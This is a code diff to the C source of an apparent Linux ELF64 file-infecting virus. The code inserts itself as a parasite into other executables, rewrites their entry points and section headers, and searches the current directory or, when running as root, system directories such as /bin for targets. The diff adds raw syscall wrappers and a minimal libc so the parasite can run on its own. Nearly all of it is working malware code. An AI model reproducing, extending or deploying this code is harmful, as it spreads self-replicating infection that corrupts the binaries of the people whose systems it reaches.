@@ -1,4 +1,62 @@
-#include "private.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/ptrace.h>
+#include <elf.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <link.h>
+#include <sys/stat.h>
+#include <stdarg.h>
+#include <time.h>
+#include <signal.h>
+#include <sys/user.h>
+#include <sys/prctl.h>
+
+
+/* libc */ 
+
+void Memset(void *mem, unsigned char byte, unsigned int len);
+void _memcpy(void *, void *, unsigned int);
+int _printf(char *, ...);
+char * itoa(long, char *);
+char * itox(long, char *);
+int _puts(char *);
+size_t _strlen(char *);
+char *_strchr(const char *, int);
+char * _strrchr(const char *, int);
+int _strncmp(const char *, const char *, size_t);
+int _strcmp(const char *, const char *);
+int _memcmp(const void *, const void *, unsigned int);
+
+/* syscalls */
+int _fstat(long, void *);
+long _lseek(long, long, unsigned int);
+void Exit(long);
+void *_mmap(void *, unsigned long, unsigned long, unsigned long,  long, unsigned long);
+long _open(const char *, unsigned long);
+long _write(long, char *, unsigned long);
+int _read(long, char *, unsigned long);
+
+unsigned long get_rip(void);
+void end_code(void);
+void dummy_marker(void);
+
+
+#if defined(DEBUG) && DEBUG > 0
+ #define DEBUG_PRINT(fmt, args...) _printf("DEBUG: %s:%d:%s(): " fmt, \
+    __FILE__, __LINE__, __func__, ##args)
+#else
+ #define DEBUG_PRINT(fmt, args...) /* Don't do anything in release builds */
+#endif
+
+#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE - 1))
+#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE) 
+#define PAGE_ROUND(x) (PAGE_ALIGN_UP(x))
+#define STACK_SIZE 0x4000000
 
 #define TMP "/tmp/.xyz.skeksi.elf64"
 
@@ -10,14 +68,18 @@
 extern long real_start;
 extern long get_rip_label;
 
-unsigned long get_rip(void);
-void end_code(void);
-void dummy_marker(void);
-
 struct bootstrap_data {
 	int argc;
 	char **argv;
 };
+
+struct linux_dirent64 {
+        uint64_t             d_ino;
+        int64_t             d_off;
+        unsigned short  d_reclen;
+        unsigned char   d_type;
+        char            d_name[0];
+} __attribute__((packed));
 
 typedef struct elfbin {
 	Elf64_Ehdr *ehdr;
@@ -38,7 +100,6 @@ typedef struct elfbin {
 _start()
 {
 	struct bootstrap_data bootstrap;
-	//_printf("%x\n", bootstrap);
 	/*
 	 * Save register state before executing parasite
 	 * code.
@@ -166,7 +227,7 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
 	unsigned int c;
 	int i, t = 0, ehdr_size = sizeof(ElfW(Ehdr));
 	unsigned char *mem = target->mem;
-	unsigned char *parasite = self->mem + ehdr_size;
+	unsigned char *parasite = self->mem;
 	char *host = target->path, *protected; 
 	struct stat st;
 
@@ -194,8 +255,10 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          * [ehdr][virus]
          */
 	DEBUG_PRINT("Writing parasite\n");
-        if ((c = _write(ofd, parasite, self->size - ehdr_size)) != self->size - ehdr_size) {
-		DEBUG_PRINT("Wrote %d bytes (not %d)\n", c, self->size - ehdr_size);
+	for (i = 0; i < 32; i++)
+		_printf("%x ", self->mem[i] & 0xff);
+        if ((c = _write(ofd, parasite, self->size)) != self->size) {
+		DEBUG_PRINT("Wrote %d bytes (not %d)\n", c, self->size);
 		return -1;
 	}
 
@@ -244,9 +307,9 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	 * Get size of parasite (self)
 	 */
         parasiteSize = self->size;
-	_printf("parasiteSize: %d\n", parasiteSize);
+	DEBUG_PRINT("parasiteSize: %d\n", parasiteSize);
 	paddingSize = PAGE_ALIGN_UP(parasiteSize + JMPCODE_LEN);
-	_printf("paddingSize: %d\n", paddingSize);
+	DEBUG_PRINT("paddingSize: %d\n", paddingSize);
 	
 	
 	mem = target->mem;
@@ -275,14 +338,20 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
                 DEBUG_PRINT("Error, unable to locate text segment in target executable: %s\n", target->path);
                 return -1;
         }
-	_printf("origText: %x\n", origText);
 	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr));
-	_printf("new e_entry %x\n", ehdr->e_entry);
 	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
-
-	for (i = 0; i < ehdr->e_shnum; i++) 
+	char *StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset];
+	for (i = 0; i < ehdr->e_shnum; i++) {
+                if (!_strncmp((char *)&StringTable[shdr[i].sh_name], ".text", 5)) {
+                        shdr[i].sh_offset = sizeof(ElfW(Ehdr)); // -= (uint32_t)paddingSize;
+			shdr[i].sh_addr = origText - paddingSize;
+			shdr[i].sh_addr += sizeof(ElfW(Ehdr));
+                        shdr[i].sh_size += self->size;
+                }  
+                else 
 		shdr[i].sh_offset += paddingSize;
-	
+
+	}
 	ehdr->e_shoff += paddingSize;
 	ehdr->e_phoff += paddingSize;
 
@@ -302,9 +371,8 @@ int load_self(elfbin_t *elf)
 	void (*f2)(void) = (void (*)())dummy_marker;
 	Elf64_Addr _start_addr = get_rip() - ((char *)&get_rip_label - (char *)&_start);
 	elf->mem = (uint8_t *)_start_addr;
-	elf->size = (char *)&end_code - (char *)&real_start; 
+	elf->size = (char *)&end_code - (char *)&_start; 
 	elf->size += (int)((char *)f2 - (char *)f1);
-	DEBUG_PRINT("end_code is %d bytes\n", (char *)f2 - (char *)f1);
 	return 0;
 }
 
@@ -404,7 +472,6 @@ void do_main(struct bootstrap_data *bootstrap)
 			{'/','b','i','n','\0'}
 			};
 
-	_printf("bootstrap: %x\n", bootstrap);
 	dir = _getuid() != 0 ? "." : randomly_select_dir((char **)dirs);
 	
 	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
@@ -428,7 +495,6 @@ void do_main(struct bootstrap_data *bootstrap)
 		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
 			d = (struct linux_dirent64 *) (dbuf + bpos);
     			bpos += d->d_reclen - 1;
-			_printf("argv[0]: %s\n", bootstrap->argv[0]);
 			if (!_strcmp(d->d_name, &bootstrap->argv[0][2])) {
 				continue;
 			}
@@ -448,6 +514,346 @@ void do_main(struct bootstrap_data *bootstrap)
 	}
 }
 
+int _getuid(void)
+{
+        unsigned long ret;
+        __asm__ volatile("mov $102, %rax\n"
+                         "syscall");
+         asm ("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+
+void Exit(long status)
+{
+        __asm__ volatile("mov %0, %%rdi\n"
+                         "mov $60, %%rax\n"
+                         "syscall" : : "r"(status));
+}
+long _open(const char *path, unsigned long flags)
+{
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov $2, %%rax\n"
+                        "syscall" : : "g"(path), "g"(flags));
+        asm ("mov %%rax, %0" : "=r"(ret));              
+        
+        return ret;
+}
+
+int _close(unsigned int fd)
+{
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov $3, %%rax\n"
+                        "syscall" : : "g"(fd));
+        return (int)ret;
+}
+
+int _read(long fd, char *buf, unsigned long len)
+{
+         long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov %2, %%rdx\n"
+                        "mov $0, %%rax\n"
+                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
+        asm("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+
+long _write(long fd, char *buf, unsigned long len)
+{
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov %2, %%rdx\n"
+                        "mov $1, %%rax\n"
+                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
+        asm("mov %%rax, %0" : "=r"(ret));
+        return ret;
+}
+
+int _fstat(long fd, void *buf)
+{
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov $5, %%rax\n"
+                        "syscall" : : "g"(fd), "g"(buf));
+        asm("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+int _rename(const char *old, const char *new)
+{
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov $82, %%rax\n"
+                        "syscall" ::"g"(old),"g"(new));
+        asm("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+
+long _lseek(long fd, long offset, unsigned int whence)
+{
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov %2, %%rdx\n"
+                        "mov $8, %%rax\n"
+                        "syscall" : : "g"(fd), "g"(offset), "g"(whence));
+        asm("mov %%rax, %0" : "=r"(ret));
+        return ret;
+
+}
+
+int _fsync(int fd)
+{
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov $74, %%rax\n"
+                        "syscall" : : "g"(fd));
+
+        asm ("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+
+void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
+{
+        long mmap_fd = fd;
+        unsigned long mmap_off = off;
+        unsigned long mmap_flags = flags;
+        unsigned long ret;
+
+        __asm__ volatile(
+                         "mov %0, %%rdi\n"
+                         "mov %1, %%rsi\n"
+                         "mov %2, %%rdx\n"
+                         "mov %3, %%r10\n"
+                         "mov %4, %%r8\n"
+                         "mov %5, %%r9\n"
+                         "mov $9, %%rax\n"
+                         "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
+        asm ("mov %%rax, %0" : "=r"(ret));              
+        return (void *)ret;
+}
+
+int _munmap(void *addr, size_t len)
+{
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov $11, %%rax\n"
+                        "syscall" :: "g"(addr), "g"(len));
+        asm ("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+
+int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+                    unsigned int count)
+{
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov %2, %%rdx\n"
+                        "mov $217, %%rax\n"
+                        "syscall" :: "g"(fd), "g"(dirp), "g"(count));
+        asm ("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+
+void _memcpy(void *dst, void *src, unsigned int len)
+{
+        int i;
+        unsigned char *s = (unsigned char *)src;
+        unsigned char *d = (unsigned char *)dst;
+
+        for (i = 0; i < len; i++) {
+                *d = *s;
+                s++, d++;
+        }
+
+}
+
+
+void Memset(void *mem, unsigned char byte, unsigned int len)
+{
+        unsigned char *p = (unsigned char *)mem; 
+        int i = len;
+        while (i--) {
+                *p = byte;
+                p++;
+        }
+}
+
+int _printf(char *fmt, ...)
+{
+        int in_p;
+        unsigned long dword;
+        unsigned int word;
+        char numbuf[26] = {0};
+        __builtin_va_list alist;
+
+        in_p;
+        __builtin_va_start((alist), (fmt));
+
+        in_p = 0;
+        while(*fmt) {
+                if (*fmt!='%' && !in_p) {
+                        _write(1, fmt, 1);
+                        in_p = 0;
+                }
+                else if (*fmt!='%') {
+                        switch(*fmt) {
+                                case 's':
+                                        dword = (unsigned long) __builtin_va_arg(alist, long);
+                                        _puts((char *)dword);
+                                        break;
+                                case 'u':
+                                        word = (unsigned int) __builtin_va_arg(alist, int);
+                                        _puts(itoa(word, numbuf));
+                                        break;
+                                case 'd':
+                                        word = (unsigned int) __builtin_va_arg(alist, int);
+                                        _puts(itoa(word, numbuf));
+                                        break;
+                                case 'x':
+                                        dword = (unsigned long) __builtin_va_arg(alist, long);
+                                        _puts(itox(dword, numbuf));
+                                        break;
+                                default:
+                                        _write(1, fmt, 1);
+                                        break;
+                        }
+                        in_p = 0;
+                }
+                else {
+                        in_p = 1;
+                }
+                fmt++;
+        }
+        return 1;
+}
+char * itoa(long x, char *t)
+{
+        int i;
+        int j;
+
+        i = 0;
+        do
+        {
+                t[i] = (x % 10) + '0';
+                x /= 10;
+                i++;
+        } while (x!=0);
+
+        t[i] = 0;
+
+        for (j=0; j < i / 2; j++) {
+                t[j] ^= t[i - j - 1];
+                t[i - j - 1] ^= t[j];
+                t[j] ^= t[i - j - 1];
+        }
+
+        return t;
+}
+char * itox(long x, char *t)
+{
+        int i;
+        int j;
+
+        i = 0;
+        do
+        {
+                t[i] = (x % 16);
+
+                /* char conversion */
+                if (t[i] > 9)
+                        t[i] = (t[i] - 10) + 'a';
+                else
+                        t[i] += '0';
+
+                x /= 16;
+                i++;
+        } while (x != 0);
+
+        t[i] = 0;
+
+        for (j=0; j < i / 2; j++) {
+                t[j] ^= t[i - j - 1];
+                t[i - j - 1] ^= t[j];
+                t[j] ^= t[i - j - 1];
+        }
+
+        return t;
+}
+
+int _puts(char *str)
+{
+        _write(1, str, _strlen(str));
+        _fsync(1);
+
+        return 1;
+}
+
+size_t _strlen(char *s)
+{
+        size_t sz;
+
+        for (sz=0;s[sz];sz++);
+        return sz;
+}
+
+      
+int _strncmp(const char *s1, const char *s2, size_t n)
+{
+	for ( ; n > 0; s1++, s2++, --n)
+		if (*s1 != *s2)
+			return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
+		else if (*s1 == '\0')
+			return 0;
+	return 0;
+}
+                                               
+int _strcmp(const char *s1, const char *s2)
+{
+        int r = 0;
+
+        while (!(r = (*s1 - *s2) && *s2))
+                s1++, s2++;
+        if (!r)
+                return r;
+        return r = (r < 0) ? -1 : 1;
+}
+
+int _memcmp(const void *s1, const void *s2, unsigned int n)
+{
+        unsigned char u1, u2;
+
+        for ( ; n-- ; s1++, s2++) {
+                u1 = * (unsigned char *) s1;
+                u2 = * (unsigned char *) s2;
+        if ( u1 != u2) {
+                return (u1-u2);
+        }
+    }
+}
+
+
+
+
+
 unsigned long get_rip(void)
 {
 	long ret;
@@ -462,6 +868,7 @@ unsigned long get_rip(void)
 
 	return ret;
 }
+
 
 
 void end_code() 
